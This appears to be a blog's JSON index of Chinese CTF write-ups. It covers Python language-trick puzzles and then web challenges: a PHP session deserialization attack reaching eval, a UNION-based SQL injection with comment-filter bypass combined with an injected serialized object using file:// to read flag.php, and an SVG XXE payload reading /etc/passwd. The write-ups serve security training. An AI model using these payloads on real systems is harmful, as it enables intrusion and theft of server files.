class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>字符串、bytes和bytearray有count函数，a.count(b)返回a中包含的b的个数。b可以为空，那么返回的结果就会变成len(a)+1。</p>\r\n<h1 id=\"max-ver-2\">11 max Ver 2</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_11</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> max(answer) != max(*answer):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>max()函数可以直接接参数如max(1,2,3)，也可以接一个list，如max([1,2,3])，max()接list的时候会自动迭代，返回最大的元素，那么max([[2]])会返回[2]，而*会自动迭代，max(*[[2]])==max([2])==2。显然两个并不相等。</p>\r\n<h1 id=\"all-zip\">12 all zip</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_12</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    a, b = answer</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a &lt; b <span class=\"keyword\">and</span> all(x &gt; y <span class=\"keyword\">for</span> x, y <span class=\"keyword\">in</span> zip(a, b)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>要求a比b小，同时all()满足条件，其中a,b用zip()组合，然后要求a&gt;b。如果a为空list，那么zip()就会变成空list，all([])为True。</p>\r\n<h1 id=\"section-2\">13 ^ -</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_13</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    a, b = answer</span><br><span class=\"line\">    <span class=\"keyword\">if</span> b <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> (a ^ b) - a:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>要求(a^b)-a==0，b!=0。但这不成立，因此参考第6题，我们可以用集合。那么a b同为{1}即可。</p>\r\n<h1 id=\"section-3\">14 +=</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_14</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    backup = deepcopy(answer)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        answer[<span class=\"number\">0</span>] += answer[<span class=\"number\">1</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> backup != answer:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>要求answer[0]+=answer[1]触发异常，同时backup不与answer相同。这个是真的不知道了，参考<a href=\"https://docs.python.org/3/faq/programming.html#why-does-a-tuple-i-item-raise-an-exception-when-the-addition-works\">这个</a>，简单来说就是+可以正常执行，但是=会出现问题然而answer的内容还是改变了。因此传一个<code>([2],[3])</code>就可以了。</p>\r\n<h1 id=\"section-4\">15 &gt;&lt;</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_15</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    item, l = answer</span><br><span class=\"line\">    <span class=\"keyword\">if</span> item <span class=\"keyword\">in</span> l <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> min(l) &lt;= item &lt;= max(l):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>item要在l中，且不满足min(l) &lt;= item &lt;= max(l)，max()可以接iterable对象，例如字符串，那么max('1234')为4，min('1234')为1，返回的都是单字符。那么当l为\"1111\"，item为'11'的时候，min max返回1，\"1\"&lt;\"11\"。</p>\r\n<h1 id=\"bytes\">16 bytes</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_16</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    item, l = answer</span><br><span class=\"line\">    <span class=\"keyword\">if</span> item == <span class=\"number\">233</span> <span class=\"keyword\">and</span> item <span class=\"keyword\">in</span> l <span class=\"keyword\">and</span> l <span class=\"keyword\">in</span> l:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>要求item==233，item in l和l in l。iterable的对象可以in，字符串可以，但是item是int，int不能in string。Python3中除了字符串，还有令人痛恨的bytes，int可以in bytes：<code>[233,b'\\xe9']</code>。</p>\r\n<h1 id=\"dict\">17 dict []</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_17</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    item, l = answer</span><br><span class=\"line\">    <span class=\"keyword\">if</span> l[<span class=\"number\">0</span>] == item <span class=\"keyword\">and</span> item <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> l:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>要求l[0]==item同时item不在l。能用[]的对象是Subscriptable的，默认情况下目前包括：字符串 元组 列表 字典。那么用字典呢？l==2,item={0:2}，int(2)不在dict({0:2})里，item[0]==2，满足条件。</p>\r\n<h1 id=\"inf-nan\">18 inf nan</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_18</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    a, b = answer</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (a - b) != -(b - a):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>list等类型不支持-，通常的int float也没办法满足条件。然后想到<a href=\"https://blog.csdn.net/davidguoguo/article/details/85261172\">NaN和Inf</a>。inf-inf==nan，nan!=nan。但是inf没法输入，我们可以用1e2345来构造。</p>\r\n<h1 id=\"unicode\">19 Unicode</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_19</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> answer.isdecimal():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> len(answer) &lt; <span class=\"number\">5</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> sum(ord(c) - ord(<span class=\"string\">&quot;0&quot;</span>) <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> answer) == <span class=\"number\">23333</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>这个就简单了，字符不一定是ASCII集，Unicode也可以。跑脚本好了。 <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> io</span><br><span class=\"line\">sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">result=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> range(<span class=\"number\">0xffff</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(chr(a).isdecimal()):</span><br><span class=\"line\">        result.append(a)</span><br><span class=\"line\"><span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> d <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (a + b + c + d - ord(<span class=\"string\">&#x27;0&#x27;</span>) * <span class=\"number\">4</span> == <span class=\"number\">23333</span>):</span><br><span class=\"line\">                    print(<span class=\"string\">&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>.format(a, b, c, d))</span><br><span class=\"line\">                    <span class=\"comment\"># print(chr(a) + chr(b) + chr(c) + chr(d))</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ((chr(a) + chr(b) + chr(c) + chr(d)).isdecimal()):</span><br><span class=\"line\">                        print(<span class=\"string\">&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>.format(a, b, c, d))</span><br><span class=\"line\">                        print(<span class=\"string\">&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&quot;</span>.format(a, b, c, d, chr(a), chr(b), chr(c), chr(d)))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\r\n<h1 id=\"int-string-bool-complex-float\">20 int string bool complex float</h1>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge_20</span>(<span class=\"params\">self, answer</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(set(str(x) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> answer)) == <span class=\"number\">7</span> <span class=\"keyword\">and</span> all(x == <span class=\"number\">0</span> <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> answer):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\r\n<p>要找7种不同的元素，并且都等于0。</p>\r\n<p>首先想到0 False 0.0 0+0j，然后注意到他是用的str()，str(-0.0)=='-0.0'，str(0.0)=='0.0'，-0.0==0.0==0。那么再加一个-0.0。同样的-0.0-0j也行，-0.0j。</p>\r\n\n    <div id=\"aplayer-sFjCexft\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"767726\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{023a745e-c1d4-4a60-8bb0-8fa6d567b264}</p>\r\n","categories":["Writeups"],"tags":["Misc","Python"]},{"title":"JarvisOJ-PHPINFO","url":"/2020/09/01/JarvisOJ-PHPINFO/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>JarvisOJ的PHPINFO，Session反序列化题。 给了源码： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//A webshell is wait for you</span></span><br><span class=\"line\">ini_set(<span class=\"string\">&#x27;session.serialize_handler&#x27;</span>, <span class=\"string\">&#x27;php&#x27;</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">OowoO</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $mdzz;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;mdzz = <span class=\"string\">&#x27;phpinfo();&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"keyword\">$this</span>-&gt;mdzz);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;phpinfo&#x27;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $m = <span class=\"keyword\">new</span> OowoO();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    highlight_string(file_get_contents(<span class=\"string\">&#x27;index.php&#x27;</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure> 传个phpinfo参数就能看phpinfo了，PHP 5.6.21版本。 给了个类OowoO，可以eval()，但是没有任何可反序列化的地方。然后开头的设置session.serialize_handler很奇怪，并且调了session_start()，又没有用到$_SESSION，应该是SESSION的问题了。查了一下session.serialize_handler，参考<a href=\"https://blog.spoock.com/2016/10/16/php-serialize-problem/\">这个</a>，主要问题是session.serialize_handler为php时会以<code>|</code>分割SESSION项，后接序列化内容。所以，我们可以通过将某些内容（例如变量）截断后添加<code>|</code>，手动添加我们可控的序列化内容。并且注意到phpinfo中serssion.serialize_handler的Master Value和Local Value不同。PHP中Session的处理是在脚本实际执行之前的，因此请求之前Session.serizlize_handler是以php_serialize方式运行的。这就造成了我们是以两种不同的php序列化方式运行，很容易造成反序列化漏洞。 然后回到这道题，我们需要找到一个输入点。回过头翻PHP文档，找SESSION的东西，还真有<a href=\"https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name\">这里</a>和<a href=\"https://www.php.net/manual/zh/session.upload-progress.php\">这里</a>，简单来说，就是如果打开了session.upload_progress.enabled，我们就可以通过form表单提交一个变量到SESSION里去。这个变量名通过phpinfo的session.upload_progress.name查看。 根据示例，我们可以照着上传upload progress变量： <figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;upload.php&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span> <span class=\"attr\">enctype</span>=<span class=\"string\">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123&quot;</span> /&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;file&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;file1&quot;</span> /&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\r\n<p>随便上传，然后抓包。我们的攻击点在于file的name，将其修改成我们想要的反序列化值即可。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">OowoO</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $mdzz=<span class=\"string\">&quot;var_dump(scandir(chr(46)));&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"keyword\">new</span> OowoO());</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure> 得到<code>O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:27:\"var_dump(scandir(chr(46)));\";&#125;</code>，注意$mdzz字符串最后一定要有一个<code>;</code>（eval）。然后由于requests的zz操作，我们要手动改包：</p>\r\n<img src=\"/2020/09/01/JarvisOJ-PHPINFO/file.png\" class=\"\">\r\n<p>首先，要以<code>|</code>开头，这是php序列化器的标志。然后所有的双引号都要转义，写Session的时候直接原样读取Content-Disposition的filename，如果不转义，由于我们要写入双引号，会造成Session序列化的截断。</p>\r\n<p>提交就可以列目录了。然后读文件即可，要注意disable_functions和服务器上文件路径。</p>\r\n<img src=\"/2020/09/01/JarvisOJ-PHPINFO/file2.png\" class=\"\">\r\n\n    <div id=\"aplayer-IcfSjUcd\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"462290\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{572ebfac-535f-46f2-873e-f7cc8bc1ecf3}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP","Web","Session"]},{"title":"BUUOJ刷题-Web-Fakebook","url":"/2020/09/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Fakebook/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>2018网鼎杯的Fakebook。</p>\r\n<p>上来允许Login和Join，Join会让我们输入用户名、密码、年龄和博客，输入这个东西有点意思。不能以http开头，不能出现127.0.0.1，随便输入www.baidu.com，通过。然后我们可以通过view.php?no=1来得到详细信息，以及Blog的内容。SSRF没跑了。</p>\r\n<p>扫源码，发现有robots.txt，user.php.bak，下载得源码。</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $blog = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\">$name, $age, $blog</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name = $name;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = (<span class=\"keyword\">int</span>)$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;blog = $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span>(<span class=\"params\">$url</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\">    </span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        $output = curl_exec($ch);</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($httpCode == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">404</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">return</span> $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getBlogContents</span> (<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get(<span class=\"keyword\">$this</span>-&gt;blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValidBlog</span> (<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $blog = <span class=\"keyword\">$this</span>-&gt;blog;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> preg_match(<span class=\"string\">&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;</span>, $blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>isValidBlog限制有点严，只允许http(s)协议，要想办法变成gopher或者file协议。</p>\r\n<p>注意到view.php?no=1，随手加个单引号，发现MySQL报错？<code>union select</code>被Ban，那就用注释绕过，然后手注。<code>http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,database(),3,4%23</code>，得到当前数据库为fakebook，<code>[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27%20limit%201),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select table_name from information_schema.tables where table_schema='fakebook' limit 1),3,4%23)</code>，当前表名为users，<code>[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27fakebook%27%20limit%201,1),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select column_name from information_schema.columns where table_schema='fakebook' limit 1,1),3,4%23)</code>，得到users表字段为：no、username、passwd、data。<code>[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20data%20from%20users%20limit%200,1),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select data from users limit 0,1),3,4%23)</code>得到data的内容，返回<code>O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:3:\"123\";s:3:\"age\";i:123;s:4:\"blog\";s:13:\"www.baidu.com\";&#125;</code>，反序列化串内容正好对应user.php.bak里的UserInfo类。</p>\r\n<p>那么，猜测一下view.php的逻辑，从数据库获取对应no的行，然后反序列化data，并显示到页面上去。那么，我们如果我们修改了反序列化串，就可以使得blog的地址不受isValidBlog()的限制。</p>\r\n<p>随手测一下flag.php，发现存在。那么file://读就可以了。构造反序列化串<code>O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:3:\"123\";s:3:\"age\";i:123;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;</code>，然后访问<code>http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(2),3,'O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:3:\"123\";s:3:\"age\";i:123;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;'%23</code>，即可得到flag.php内容。</p>\r\n\n    <div id=\"aplayer-pSwTjvPY\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"343502\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{5c18e6fa-598b-43f4-a7d7-719332e3d8af}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP","Web"]},{"title":"BUUOJ刷题-Web-SVGMagic","url":"/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>BSidesCTF 2019的SVGMagic。开题让我们上传文件，上传其他文件报500，上传SVG会成功渲染，并显示PNG渲染结果。</p>\n<p>SVG实际上是一个XML文档。因此可能出现XXE问题。我们试一下。翻<a href=\"https://developer.mozilla.org/en-US/docs/Web/SVG/Element\">参考文档</a>SVG标签中能插入元素的有&lt;text&gt;，所以直接写一个进去：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;512px&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;190px&quot;</span> <span class=\"attr\">viewBox</span>=<span class=\"string\">&quot;0 0 512 190&quot;</span> <span class=\"attr\">version</span>=<span class=\"string\">&quot;1.1&quot;</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"attr\">xmlns:xlink</span>=<span class=\"string\">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class=\"attr\">preserveAspectRatio</span>=<span class=\"string\">&quot;xMidYMid&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;15&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;red&quot;</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>上传看PNG图片即可得到内容。下一步是拿flag。这题当时环境是让我们拿flag.txt，但是位置不知道。所以盲测。找了一圈，最后猜是在程序根目录下，file:///proc/self/cwd/flag.txt。</p>\n\n    <div id=\"aplayer-aslarXIS\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"19081573\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\n<p>flag{f189ef14-aaaa-429d-88eb-08c721bbedff}</p>\n","categories":["Writeups"],"tags":["Web","XXE","SVG"]},{"title":"BUUOJ刷题-Web-EasyJava","url":"/2020/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-EasyJava/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div 